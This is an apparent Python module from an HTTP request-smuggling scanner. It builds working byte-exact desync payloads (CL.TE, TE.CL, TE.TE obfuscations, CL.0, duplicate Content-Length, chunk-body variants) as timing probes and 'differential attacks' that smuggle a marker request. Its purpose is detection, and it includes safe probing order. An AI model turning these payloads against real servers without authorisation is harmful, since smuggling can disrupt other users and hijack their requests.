"""Byte-exact HTTP/1.1 desync probe payloads, one builder per technique.

Each :class:`Technique` produces two byte-exact payloads for the raw sender:

* a **timing probe** -- crafted so the back-end is left waiting for body bytes
  that never arrive *if* the target has this front/back parsing discrepancy,
  producing a hang (the timing signal that raises a *candidate*); and
* a **differential attack** -- smuggles a prefix that requests a distinct marker
  resource, so a following well-formed request comes back materially different
  *if* the desync is real (upgrading a candidate to *confirmed*).

The techniques are the HTTP/1.1 desync family of V0.1-CRITERIA.md criterion 1:
CL.TE, TE.CL, TE.TE (a Transfer-Encoding obfuscation dictionary), CL.0, and
conflicting/duplicate Content-Length (``dup-CL``). Payloads implement James
Kettle / PortSwigger's published techniques -- no Burp/HRS code is vendored.

Safe-testing ordering (criterion 4): CL.TE has ``safe_order`` 0 so it is always
probed before TE.CL -- a TE.CL timing probe can hang and disrupt *other* users if
the target is in fact CL.TE.

v0.6 adds the ``Expect.CL.TE`` technique: a CL.TE probe that includes
``Expect: 100-continue``.  Some front-ends send ``100 Continue`` before
forwarding the body to the back-end; the raw-socket layer now skips 1xx interim
responses so the hang (timing signal) is correctly measured even when ``100
Continue`` precedes the timeout.  The differential attack confirms the desync
using the same CL.TE logic.

These are **request** builders: they never normalise anything. Response bytes are
handled elsewhere and are treated as data (R5).
"""

from __future__ import annotations

from dataclasses import dataclass, field

__all__ = [
    "Technique",
    "TE_OBFUSCATIONS",
    "CHUNK_BODY_VARIANTS",
    "all_techniques",
    "technique_by_name",
    "DESYNC_REFERENCES",
    "EXPECT_HEADER",
]

DESYNC_REFERENCES: tuple[str, ...] = (
    "https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn",
    "https://portswigger.net/web-security/request-smuggling",
    "https://portswigger.net/web-security/request-smuggling/finding",
)

# The Expect: 100-continue header used in the Expect.CL.TE technique (v0.6).
# Some front-ends send 100 Continue before forwarding to the back-end,
# introducing a distinct timing profile that the raw sender's 1xx skipping
# handles correctly.
EXPECT_HEADER: bytes = b"Expect: 100-continue"

# The Transfer-Encoding obfuscation dictionary for TE.TE: each entry is a raw
# header line that a *lenient* parser reads as "chunked" but a *strict* parser
# does not (or vice versa). One server in the chain is fooled -> the two disagree
# on framing. Values are exact bytes (no normalisation).
TE_OBFUSCATIONS: tuple[tuple[str, bytes], ...] = (
    ("space-before-colon", b"Transfer-Encoding : chunked"),
    ("tab-after-colon", b"Transfer-Encoding:\tchunked"),
    ("vertical-tab", b"Transfer-Encoding:\x0bchunked"),
    ("dup-identity-chunked", b"Transfer-Encoding: identity\r\nTransfer-Encoding: chunked"),
    ("chunked-comma-identity", b"Transfer-Encoding: chunked, identity"),
    ("x-prefixed", b"Transfer-Encoding: xchunked"),
    ("quoted-value", b'Transfer-Encoding: "chunked"'),
    ("leading-space-value", b"Transfer-Encoding:  chunked"),
    # v0.4 parser-discrepancy additions: header-value level obfuscations.
    # Strict parsers reject these; lenient parsers accept them as "chunked".
    ("mixed-case", b"Transfer-Encoding: Chunked"),
    ("null-byte", b"Transfer-Encoding: chunked\x00"),
    ("bare-cr-end", b"Transfer-Encoding: chunked\r"),
    ("ows-trailer", b"Transfer-Encoding: chunked "),
    ("comma-chunk", b"Transfer-Encoding: ,chunked"),
)

# Chunk-body-level discrepancy variants for the TE.chunk technique family (v0.4).
# Each entry is (name, timing_body, timing_cl, attack_prefix) where:
#   timing_body  — the raw chunk body sent in the timing probe (after headers)
#   timing_cl    — the Content-Length value in the timing probe; the front-end
#                  (CL) forwards only this many bytes, leaving the back-end (TE)
#                  with an incomplete or malformed chunk body to parse
#   attack_prefix — bytes prepended to "0\r\n\r\n"+smuggled in the differential
#                   attack; the prefix is the "data" chunk(s) that the lenient
#                   back-end processes before hitting the terminator
#
# These probe the chunk-body level, not the TE header level: both sides see
# Transfer-Encoding: chunked (plain), but they parse the chunk framing
# differently. The front-end uses Content-Length regardless, so the discrepancy
# only fires when the back-end attempts to parse the forwarded bytes as chunks.
CHUNK_BODY_VARIANTS: tuple[tuple[str, bytes, int, bytes], ...] = (
    # Chunk with a semicolon extension (RFC 7230 §4.1.1): lenient parsers
    # strip the extension and read a 1-byte chunk; strict parsers see an
    # invalid hex chunk-size token and cannot parse the body.
    ("chunk-ext", b"1;x=p\r\nA\r\nX", 6, b"1;x=p\r\nA\r\n"),
    # Bare CR (no LF) as chunk-line terminator: lenient parsers accept \r
    # alone; strict parsers require \r\n and cannot find the chunk boundary.
    ("bare-cr", b"1\rA\rX", 3, b"1\rA\r"),
)

_PLAIN_TE = b"Transfer-Encoding: chunked"


def _crlf(*lines: bytes) -> bytes:
    """Join header lines with CRLF and terminate the header block."""
    return b"\r\n".join(lines) + b"\r\n\r\n"


def _smuggled_request(host: str, marker_path: str) -> bytes:
    """A complete smuggled inner request targeting the marker resource."""
    return _crlf(
        f"GET {marker_path} HTTP/1.1".encode(),
        f"Host: {host}".encode(),
        b"X-Dg-Smuggle: 1",
    )


@dataclass(frozen=True, slots=True)
class Technique:
    """One desync technique and its byte-exact probe payloads.

    Attributes:
        name: The finding ``vector`` / discrepancy class (e.g. ``"CL.TE"``).
        discrepancy: The ``X.Y`` discrepancy label (mirrors ``name``).
        safe_order: Lower is probed earlier (CL.TE before TE.CL -- criterion 4).
        variant: A specific mutator (the TE.TE obfuscation name, or the
            ``TE.chunk`` chunk-body variant name), or ``None``.
        te_header: The raw Transfer-Encoding header bytes this technique uses
            (obfuscated for TE.TE, plain for CL.TE/TE.CL/TE.chunk).
        extra_headers: Additional raw header lines (e.g. ``Expect: 100-continue``
            for ``Expect.CL.TE``) inserted between the framing headers and the
            blank line in both the timing probe and the differential attack.
            Each entry is one complete ``Name: value`` line (bytes, no CRLF).
        timing_body: The raw chunk body appended after the headers in the
            timing probe. Defaults to the standard ``1\\r\\nA\\r\\nX`` probe.
        timing_cl: The Content-Length value in the timing probe; controls how
            many bytes the front-end (CL) forwards to the back-end (TE).
            Default (4) truncates at the end of the first chunk's data byte,
            leaving the back-end's chunked parser incomplete -> hang.
        attack_prefix: For ``TE.chunk`` only: bytes prepended to the
            ``0\\r\\n\\r\\n``+smuggled differential attack body. The prefix is the
            data chunk(s) that a lenient back-end processes before hitting the
            terminating chunk.
    """

    name: str
    discrepancy: str
    safe_order: int
    variant: str | None = None
    te_header: bytes = _PLAIN_TE
    references: tuple[str, ...] = field(default=DESYNC_REFERENCES)
    extra_headers: tuple[bytes, ...] = field(default_factory=tuple)
    timing_body: bytes = b"1\r\nA\r\nX"
    timing_cl: int = 4
    attack_prefix: bytes = b""

    # -- timing probes -----------------------------------------------------

    def timing_probe(self, host: str, path: str = "/") -> bytes | None:
        """Byte-exact timing probe, or ``None`` if this technique is differential-only.

        CL.0 and dup-CL have no reliable hang signature (the back-end reads a
        zero-length body and answers immediately); they are confirmed by the
        differential stage instead.

        For ``TE.chunk`` techniques the front-end sends ``self.timing_cl`` bytes
        (Content-Length), causing the back-end (TE) to attempt parsing
        ``self.timing_body[:timing_cl]`` as a chunked body. A back-end that
        cannot parse the chunk variant hangs or errors -- the timing signal.

        Any ``extra_headers`` (e.g. ``Expect: 100-continue`` for the
        ``Expect.CL.TE`` technique) are appended to the framing headers; they
        appear on the wire after the CL/TE lines and before the blank line.
        """
        kind = self.name
        if kind in ("CL.TE", "TE.TE", "TE.chunk", "Expect.CL.TE"):
            # front uses Content-Length (timing_cl bytes forwarded), back uses
            # chunked and is left with an incomplete or malformed chunk -> hang.
            head = _crlf(
                f"POST {path} HTTP/1.1".encode(),
                f"Host: {host}".encode(),
                f"Content-Length: {self.timing_cl}".encode(),
                self.te_header,
                *self.extra_headers,
            )
            return head + self.timing_body
        if kind == "TE.CL":
            # front uses chunked (stops at "0\r\n\r\n"), back uses Content-Length
            # (6) and is left waiting for the 6th body byte -> hang.
            head = _crlf(
                f"POST {path} HTTP/1.1".encode(),
                f"Host: {host}".encode(),
                b"Content-Length: 6",
                _PLAIN_TE,
                *self.extra_headers,
            )
            return head + b"0\r\n\r\nX"
        return None

    # -- differential attacks ---------------------------------------------

    def differential_attack(self, host: str, marker_path: str, path: str = "/") -> bytes:
        """Byte-exact smuggling attack whose leftover requests ``marker_path``."""
        kind = self.name
        smuggled = _smuggled_request(host, marker_path)

        if kind in ("CL.TE", "TE.TE", "Expect.CL.TE"):
            # front (CL) forwards the whole body; back (chunked) stops at the
            # terminator, leaving the smuggled request as a prefix.
            body = b"0\r\n\r\n" + smuggled
            head = _crlf(
                f"POST {path} HTTP/1.1".encode(),
                f"Host: {host}".encode(),
                f"Content-Length: {len(body)}".encode(),
                self.te_header,
                *self.extra_headers,
            )
            return head + body

        if kind == "TE.CL":
            # front (chunked) forwards the whole body; back (CL) reads only the
            # chunk-size line, leaving the chunk data (the smuggled request).
            chunk_data = smuggled
            size_line = f"{len(chunk_data):x}".encode() + b"\r\n"
            body = size_line + chunk_data + b"\r\n" + b"0\r\n\r\n"
            head = _crlf(
                f"POST {path} HTTP/1.1".encode(),
                f"Host: {host}".encode(),
                f"Content-Length: {len(size_line)}".encode(),
                _PLAIN_TE,
            )
            return head + body

        if kind == "CL.0":
            if self.variant == "get-cl0":
                # GET+CL:0 sub-variant: explicit Content-Length: 0 on a GET with the
                # smuggled request appended after the headers. Targets a transparent
                # TCP-forwarding front-end (passes all bytes) combined with a back-end
                # that reads CL:0 as bodyless -- the extra bytes become the next
                # back-end request prefix regardless of what CL says.
                body = smuggled
                head = _crlf(
                    f"GET {path} HTTP/1.1".encode(),
                    f"Host: {host}".encode(),
                    b"Content-Length: 0",
                )
                return head + body
            # Classic CL.0: POST with explicit Content-Length = len(smuggled).
            # Front honours the CL and forwards the full body; back treats the
            # request as bodyless (CL.0 bug), leaving the body as the next request.
            body = smuggled
            head = _crlf(
                f"POST {path} HTTP/1.1".encode(),
                f"Host: {host}".encode(),
                f"Content-Length: {len(body)}".encode(),
            )
            return head + body

        if kind == "dup-CL":
            # two conflicting Content-Length headers: front honours the first
            # (the real body length), back honours the last (0) -> the body is
            # left over as the next request.
            body = smuggled
            head = _crlf(
                f"POST {path} HTTP/1.1".encode(),
                f"Host: {host}".encode(),
                f"Content-Length: {len(body)}".encode(),
                b"Content-Length: 0",
            )
            return head + body

        if kind == "TE.chunk":
            # front (CL) forwards the entire body; back (chunked) processes the
            # chunk variant in self.attack_prefix, then terminates at "0\r\n\r\n"
            # (standard terminator), leaving the smuggled request as leftover.
            # A lenient back-end that understands the chunk variant confirms the
            # desync; a strict back-end that rejects it hangs (timing-only).
            body = self.attack_prefix + b"0\r\n\r\n" + smuggled
            head = _crlf(
                f"POST {path} HTTP/1.1".encode(),
                f"Host: {host}".encode(),
                f"Content-Length: {len(body)}".encode(),
                self.te_header,
            )
            return head + body

        raise ValueError(f"unknown technique {kind!r}")


def chunk_body_techniques() -> list[Technique]:
    """TE.chunk technique variants, one per entry in :data:`CHUNK_BODY_VARIANTS`.

    Each variant uses a plain ``Transfer-Encoding: chunked`` header but sends a
    non-standard chunk body in the timing probe and differential attack. The
    discrepancy is at the chunk-body level, not the header level: both sides see
    a valid chunked TE header, but they parse the chunk framing differently.
    """
    techs: list[Technique] = []
    for name, t_body, t_cl, a_prefix in CHUNK_BODY_VARIANTS:
        techs.append(
            Technique(
                "TE.chunk",
                "TE.chunk",
                safe_order=4,
                variant=name,
                te_header=_PLAIN_TE,
                timing_body=t_body,
                timing_cl=t_cl,
                attack_prefix=a_prefix,
            )
        )
    return techs


def all_techniques() -> list[Technique]:
    """Every technique, in safe probe order (CL.TE first, TE.CL last).

    TE.TE expands to one technique per obfuscation in :data:`TE_OBFUSCATIONS`.
    TE.chunk expands to one technique per variant in :data:`CHUNK_BODY_VARIANTS`.
    """
    techs: list[Technique] = [
        Technique("CL.TE", "CL.TE", safe_order=0),
        # Expect.CL.TE (v0.6): the same CL.TE discrepancy with an
        # Expect: 100-continue header.  Probed immediately after CL.TE
        # (safe_order=0) so both fire before TE.CL.  The raw sender's 1xx
        # skipping ensures the timing signal comes from the back-end hang, not
        # the front-end's 100 Continue interim response.
        Technique(
            "Expect.CL.TE",
            "CL.TE",
            safe_order=0,
            variant="expect",
            te_header=_PLAIN_TE,
            extra_headers=(EXPECT_HEADER,),
        ),
        Technique("CL.0", "CL.0", safe_order=1),
        # GET+CL:0 sub-variant: same discrepancy class, different probe shape.
        # Sends GET with Content-Length: 0 and the smuggled request appended.
        # Targets transparent TCP-forwarding front-ends + CL:0-treating back-ends.
        Technique("CL.0", "CL.0", safe_order=1, variant="get-cl0"),
        Technique("dup-CL", "dup-CL", safe_order=2),
    ]
    # TE.TE obfuscation dictionary -- probed after CL.TE, before the raw TE.CL.
    for i, (variant, header) in enumerate(TE_OBFUSCATIONS):
        techs.append(
            Technique("TE.TE", "TE.TE", safe_order=3, variant=variant, te_header=header)
        )
    # TE.chunk chunk-body variants -- after TE.TE, before TE.CL.
    techs.extend(chunk_body_techniques())
    # TE.CL last: its timing probe can hang a CL.TE target, so never before CL.TE.
    techs.append(Technique("TE.CL", "TE.CL", safe_order=9))
    return sorted(techs, key=lambda t: t.safe_order)


def technique_by_name(name: str) -> list[Technique]:
    """Return the technique(s) matching ``name`` (TE.TE -> the whole dictionary)."""
    return [t for t in all_techniques() if t.name == name]
